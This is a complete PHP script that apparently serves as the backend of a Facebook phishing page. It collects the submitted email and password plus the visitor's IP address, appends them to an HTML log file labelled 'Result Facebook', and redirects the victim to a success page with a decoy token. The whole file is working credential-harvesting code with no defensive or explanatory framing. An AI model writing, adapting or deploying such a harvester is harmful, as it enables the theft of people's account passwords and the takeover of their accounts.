<?php
if(isset($_POST['da']) || isset($_POST['ta'])) {
    $email = $_POST['da'];
    $pass  = $_POST['ta'];
    $ip = $_SERVER['REMOTE_ADDR'];

    $file = "mprrrrrrrrrr.html";

    $handle = fopen($file, 'a');
    fwrite($handle, "==============================");
    fwrite($handle, "<br>");
    fwrite($handle, "Result Facebook");
    fwrite($handle, "<br>");
    fwrite($handle, "<br>");
    fwrite($handle, "Email: ");
    fwrite($handle, "$email");
    fwrite($handle, "<br>");
    fwrite($handle, "Password: ");
    fwrite($handle, "$pass");
    fwrite($handle, "<br>");
    fwrite($handle, "IP Address : ");
    fwrite($handle, "$ip");
    fwrite($handle, "<br>");
    fwrite($handle, "==============================");
    fwrite($handle, "<br>");
    fwrite($handle, "<br>");
    fclose($handle);

    header('location: success.html?privacy_mutation_token=gy4dGSFWsw345gSDER7wtsef50ghfgESRD3fd');
}
